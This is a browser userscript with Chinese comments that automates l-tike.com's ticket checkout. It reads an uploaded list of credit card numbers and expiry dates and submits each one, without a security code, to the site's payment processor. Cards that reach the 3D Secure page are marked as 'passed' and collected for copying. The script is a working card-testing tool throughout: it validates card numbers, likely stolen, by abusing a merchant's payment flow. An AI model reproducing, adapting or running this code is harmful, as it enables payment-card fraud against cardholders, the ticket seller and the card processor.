// ==UserScript==
// @name         乐天脚本
// @namespace    http://tampermonkey.net/
// @version      2025-12-16
// @description  f.u.c.k l.t.i.k.e
// @author       You
// @run-at       document-body // 在 document-body 时运行
// @match        https://l-tike.com/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=l-tike.com
// @grant        GM_xmlhttpRequest
// @connect      service5.cacs.jp
// @connect      mul-pay.jp
// @connect      fep.sps-system.com
// @license MIT
// @downloadURL https://update.greasyfork.org/scripts/559061/%E4%B9%90%E5%A4%A9%E8%84%9A%E6%9C%AC.user.js
// @updateURL https://update.greasyfork.org/scripts/559061/%E4%B9%90%E5%A4%A9%E8%84%9A%E6%9C%AC.meta.js
// ==/UserScript==

// 购票地址[弃用]
// https://l-tike.com/order/?gLcode=39219

// 购票参数(购票页中打开控制台，切换到网络标签)
// 获取教程：
// 1.购票页中打开控制台，切换到网络标签，勾选"保留日志"或者小齿轮内的"持续记录"
// 2.筛选器输入框中，输入内容"condition"
// 3.选票、选数量、点击申请
// 4.可以看到网络窗口中出现一条condition数据，查看这条数据，切换到"请求"或者"负载"选项卡
// 5.查看原始信息，复制原始信息，替换下面ticket的内容即可
// 6.如果没票了，需要更换这条数据

const start_time = 1000; // 等待执行时间（毫秒）
const debug = false;

(async function () {
  "use strict";
  const path = window.location.pathname;
  await sleep(start_time);
  await insertHTML();

  // 如果是程序刷新的页面，则自动重启任务
  if (localStorage.getItem("AS_RESTART")) {
    setTimeout(() => {
      localStorage.removeItem("AS_RESTART");
      status_ctrl.work();
    }, 2000);
  }
})();

const status_tag = {
  standby: "待机",
  work: "正在运行",
  restart: "等待重试",
  login: "等待登录",
};
let _status = "standby";

const status_ctrl = {
  standby(clear) {
    _status = "standby";
    if (clear) set_step("");
  },
  work() {
    _status = "work";
    worker();
  },
  restart() {
    _status = "restart";
    localStorage.setItem("AS_RESTART", 1);
    set_step("");
    window.location.reload();
  },
  login() {
    _status = "login";
    set_step("");
  },
};

function set_step(step) {
  document.querySelector(
    "#as-status"
  ).innerText = `${status_tag[_status]} ${step}`;
}

async function worker() {
  if (_status != "work") return;

  set_step("S1");
  const data = as_get_data();
  if (!data.current.num) {
    print("卡号获取失败");
    status_ctrl.standby(true);
    return;
  }
  console.log(data.current);

  const s1 = await step.s1();
  // 如果s1获取不到，并且任务状态是work的时候，则变回待机状态
  if (!s1.rpfci) {
    if (_status == "work") status_ctrl.standby(true);
    return false;
  }
  const s2 = await step.s2(s1);
  if (!s2.info.rpfci) {
    status_ctrl.restart();
    return false;
  }
  const s3 = await step.s3(s2.info.rpfci);
  if (!s3.info.rpfci) {
    status_ctrl.restart();
    return false;
  }
  s3.info.pan = data.current.num; //  信用卡号
  s3.info.expiryDate = data.current.m + data.current.y; // 信用卡有效期
  s3.info.securityCode = ""; // 信用卡安全码
  data.list[data.index].used = true; // 标记该卡已使用
  const s4 = await step.s4(s3.info);
  if (!s4.form) {
    status_ctrl.restart();
    return false;
  }
  const s5 = await step.s5(s4.info, s4.form);
  if (s5.code == 0) data.list[data.index].check = true; // 标记该卡已通过
  localStorage.setItem("NumData", JSON.stringify(data.list));
  if (s5.code == 2) alert("A-Box: " + s5.msg);
  as_refresh_dom();
  set_step("");

  setTimeout(() => {
    worker();
  }, start_time);
}

const headers = {
  "User-Agent": navigator.userAgent,
  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "Accept-Language": "zh-CN,en-US;q=0.7,en;q=0.3",
  "Content-Type": "application/x-www-form-urlencoded",
  "Upgrade-Insecure-Requests": "1",
  "Sec-Fetch-Dest": "document",
  "Sec-Fetch-Mode": "navigate",
  "Sec-Fetch-Site": "same-origin",
  "Sec-Fetch-User": "?1",
  Priority: "u=0, i",
};

const step = {
  async s1() {
    print("选票");
    const ticket = localStorage.getItem("as-ticket");
    const res = await fetch(
      "https://l-tike.com/pub/Tt/Ttx040reservelogin/condition",
      {
        credentials: "include",
        headers: headers,
        body: ticket.replaceAll("\n", ""),
        method: "POST",
        mode: "cors",
      }
    ).catch((error) => {
      console.error(error);
      status_ctrl.restart();
    });
    if (res.ok) {
      const s1_text = await res.text();
      if (debug) {
        print("HTML信息");
        console.log(s1_text);
      }
      return input_value(s1_text);
    } else return {};
  },

  async s2(info) {
    set_step("S2");
    print("确认支付方式");
    info.PAYMENT_MTHD_SEL = "02";
    const res = await as_post_html(
      "https://l-tike.com/res/Tt/Ttd010firstcometakepayment/confirm",
      `https://l-tike.com/res/Tt/Ttd010firstcometakepayment/index?rpfci=${info.rpfci}`,
      generateBody(info)
    );
    return res;
  },

  async s3(rpfci) {
    set_step("S3");
    print("确认下单");
    const res = await as_post_html(
      "https://l-tike.com/res/Tt/Ttd020firstcomeconfirm/regist",
      `https://l-tike.com/res/Tt/Ttd010firstcometakepayment/confirm`,
      generateBody({ rpfci: rpfci, REDIRECT_UPDATE_FORM_BUTTON: "" })
    );
    return res;
  },

  async s4(info) {
    set_step("S4");
    print("提交卡信息");
    const res = await as_corss(
      "https://service5.cacs.jp/disp/ONECLICKCOMM.do",
      generateBody(info)
    );

    if (res.info) {
      const form = new DOMParser()
        .parseFromString(res.html, "text/html")
        .querySelector("form");
      return { info: res.info, form };
    } else return false;
  },

  async s5(info, form) {
    set_step("S5");
    print("验证卡信息");
    const res = await as_post_html(
      form.action,
      `https://l-tike.com/`,
      generateBody(info)
    );
    let msg = { code: null, msg: "..." };
    if (res.html.search("先着予約確認") != -1) {
      msg = { code: 1, msg: "未通过" };
    } else if (res.html.search("先着予約完了") != -1) {
      msg = { code: 1, msg: "未通过" };
    } else if (res.html.search("3Dセキュア認証画面へ") != -1) {
      msg = { code: 0, msg: "通过" };
    } else msg = { code: 2, msg: "意料外的页面，请检查控制台并联系技术员" };
    return msg;
  },
};

// 睡眠时间
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// 打印信息
function print(text) {
  console.log(`A-Box: ${text}`);
}

// 组合URL参数
function generateBody(Options) {
  let url = "";
  if (Options != null) {
    for (const key in Options) {
      url += `&${key}=${Options[key]}`;
    }
  }
  return url.substring(1); // 删除第一个字符，也就是"&"
}

// 直接获取网页的input信息
function input_value(html) {
  let doc = document.body;
  if (html) doc = new DOMParser().parseFromString(html, "text/html");
  if (doc.title) {
    print("HTML_Title " + doc.title);
    if (doc.title.search("予約ログイン") != -1) status_ctrl.login();
  }
  const nodes = doc.querySelectorAll("input");
  const info = {};

  for (const item of nodes) {
    if (item.name && item.value) info[item.name] = item.value;
  }

  if (debug) {
    print("Input信息");
    console.log(info);
  }

  return info;
}

// 请求html，并获取页面中的input内容
async function as_post_html(url, ref, opt) {
  const res = await fetch(url, {
    credentials: "include",
    headers: headers,
    referrer: ref,
    body: opt,
    method: "POST",
    mode: "cors",
  });

  const text = await res.text();
  if (debug) {
    print("HTML信息");
    console.log(text);
  }

  if (text.search("<html") != -1) {
    const info = input_value(text);
    return { html: text, info: info };
  } else return {};
}

// 跨域请求
function as_corss(url, body) {
  const _headers = JSON.parse(JSON.stringify(headers));
  _headers["Sec-Fetch-Site"] = "cross-site";
  delete _headers["Sec-Fetch-User"];

  return new Promise((resolve, reject) => {
    GM_xmlhttpRequest({
      method: "POST",
      url: url,
      headers: _headers,
      data: body,
      referrer: "https://l-tike.com/",
      onload: function (response) {
        console.log(
          `状态码:${response.status}`,
          `响应数据:${response.responseText}`
        );
        if (response.status >= 200 && response.status < 300) {
          const text = response.responseText;
          if (text.search("<html") != -1) {
            const info = input_value(text);
            resolve({ html: text, info: info });
          } else resolve({ html: text });

          resolve(response.responseText);
        } else {
          reject(new Error(`HTTP ${response.status}: ${response.statusText}`));
        }
      },
      onerror: reject,
      ontimeout: () => reject(new Error("请求超时")),
    });
  });
}

// 插入程序界面
async function insertHTML() {
  const doc = new DOMParser().parseFromString(_template, "text/html");
  const box = doc.querySelector(".a-box");
  document.body.appendChild(box);
  injectScript(_script);
}

// 插入js脚本
function injectScript(code) {
  const script = document.createElement("script");
  script.textContent = `(function() { ${code} })();`;
  (document.head || document.documentElement).appendChild(script);
  // script.remove();
  document.addEventListener("as_start", () => status_ctrl.work()); // 为网页添加一个呼叫篡改猴的事件
  document.addEventListener("as_stop", () => status_ctrl.standby()); // 为网页添加一个呼叫篡改猴的事件
  // 触发自定义事件
  document.querySelector("#as_start").addEventListener("click", () => {
    const event = new CustomEvent("as_start");
    document.dispatchEvent(event);
  });
  document.querySelector("#as_stop").addEventListener("click", () => {
    const event = new CustomEvent("as_stop");
    document.dispatchEvent(event);
  });
  set_step("");
  as_refresh_dom();
}

const _template = `
<div class="a-box">
  <input
    type="file"
    id="fileInput"
    onchange="choose_file()"
    style="display: none"
  />

  <div class="title">
    <div>当前状态：<span id="as-status">...</span></div>
    <div class="flex-1"></div>
    <button id="as_start">开始</button>
    <button id="as_stop">停止</button>
    <button onclick="as_ticket()">选票</button>
  </div>

  <div>当前卡号：<span id="as-now">0</span></div>
  <div class="status">
    <div>进度总览：<span id="as-curr">0</span>/<span id="as-all">0</span></div>
    <button onclick="open_input()">上传文件</button>
  </div>
  <details class="a-details">
    <summary class="title">
      <div class="flex-1">已通过卡号：<span id="as-right">0</span></div>
      <button onclick="as_copy()">复制结果</button>
    </summary>

    <div id="as-right-list">...</div>
  </details>

  <style>
    .a-box {
      position: fixed;
      right: 3vw;
      top: 72px;
      width: 300px;
      display: flex;
      flex-direction: column;
      gap: 10px;
      font-size: 14px;
      padding: 10px;
      min-width: 200px;
      background-color: white;
      border: 2px solid black;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      z-index: 100;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, Segoe UI,
        Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue,
        sans-serif;
    }

    .a-box .title {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .a-box button {
      color: blue;
    }

    .a-box .status {
      display: flex;
      justify-content: space-between;
    }

    .a-details {
      display: flex;
      flex-direction: column;
    }

    .a-details[open] {
      min-height: 50vh;
    }

    .a-details > summary {
      cursor: pointer;
      user-select: none;
    }

    .a-details > summary::before {
      content: "+";
      width: 1em;
    }
    .a-details[open] > summary::before {
      content: "-";
    }

    #as-right-list {
      flex: 1;
      background-color: rgba(0, 0, 0, 0.1);
      overflow-y: auto;
    }

    .flex-1 {
      flex: 1;
    }
  </style>
</div>
`;

// 这里需要使用双反斜杠，正常代码是单反斜杠
const _script = `
console.log("A-box: 插入函数");
window.open_input = () => {
  document.querySelector("#fileInput").click();
};

window.choose_file = () => {
  window.as_upload(document.querySelector("#fileInput").files[0]);
};

// window.as_start = () => {};
// window.as_stop = () => {};

window.as_copy = () => {
  const text = document.querySelector("#as-right-list").innerText;
  navigator.clipboard.writeText(text);
};

window.as_ticket = () => {
  let text = prompt("请输入购票参数");
  if (text.search("c_LCODE") == -1) {
    alert("参数错误");
  } else {
    console.log(text);
    localStorage.setItem("as-ticket", text);
  }
};

// 提取文件后缀名的函数
window.getFileExtension = (filename) => {
  const lastDot = filename.lastIndexOf(".");
  if (lastDot !== -1) {
    return filename.substring(lastDot + 1).toLowerCase();
  } else return null;
};

// 获取存储的数据
window.as_get_data = () => {
  const obj = {
    list: [], // 所有列表
    check: [], // 已通过检测的列表
    current: {}, // 当前任务信息
    index: null, // 当前任务位置
    used_count: 0, // 已经使用数据的数量
  };
  let array = localStorage.getItem("NumData");
  if (array) {
    array = JSON.parse(array);
    for (let i = 0; i < array.length; i++) {
      const item = array[i];
      if (item.check) obj.check.push(item); // 已通过的数据添加入check[]中

      //  找到未使用的数据，加入到current中，并记录好index，只添加第一次找到的未使用数据
      if (!item.used && !obj.current.num) {
        obj.current = item; //  current 应当包含:num卡号，m月份，y年份
        obj.index = i;
      }
      if (item.used) obj.used_count++;
    }
    obj.list = array;
  }
  console.log(obj);
  return obj;
};

// 刷新dom信息
window.as_refresh_dom = () => {
  const data = window.as_get_data();
  // 当前状态
  // document.querySelector("#as-status").innerText = "";
  // 显示总数
  document.querySelector("#as-all").innerText = data.list.length;
  // 当前位置
  const as_curr = document.querySelector("#as-curr");
  if (data.index != null) as_curr.innerText = data.index + 1;
  else as_curr.innerText = data.list.length;
  // 通过数
  document.querySelector("#as-right").innerText = data.check.length;
  // 当前卡号
  const as_now = document.querySelector("#as-now");
  if (data.current.num) as_now.innerText = data.current.num;
  else as_now.innerText = "无";
  // 清空已确认卡号
  document.querySelector("#as-right-list").innerHTML = "";
  // 添加已通过的卡号
  for (const item of data.check) {
    const div = document.createElement("div");
    div.innerText = item.num + "-" + item.m + "-" + item.y;
    document.querySelector("#as-right-list").appendChild(div);
  }
};

// 这里需要使用双反斜杠，正常代码是单反斜杠
window.as_upload = (file) => {
  const ext = window.getFileExtension(file.name);
  if (ext != "txt") alert("A-Box: 请选择txt文件");
  else {
    // 读取文本文件
    const reader = new FileReader();
    reader.readAsText(file, "utf-8");
    reader.onload = (e) => {
      let content = e.target.result;
      content = content.replaceAll(" ", "").replaceAll("\\r", ""); // 去空格
      content = content.split("\\n"); // 按换行分割

      const array = [];
      for (const item of content) {
        if (item) {
          const sp = item.split("-");
          if (sp.length == 3) {
            array.push({ num: sp[0], m: sp[1], y: sp[2], used: false });
          }
        }
      }
      localStorage.setItem("NumData", JSON.stringify(array));
      window.as_refresh_dom();
    };
  }
};
`;
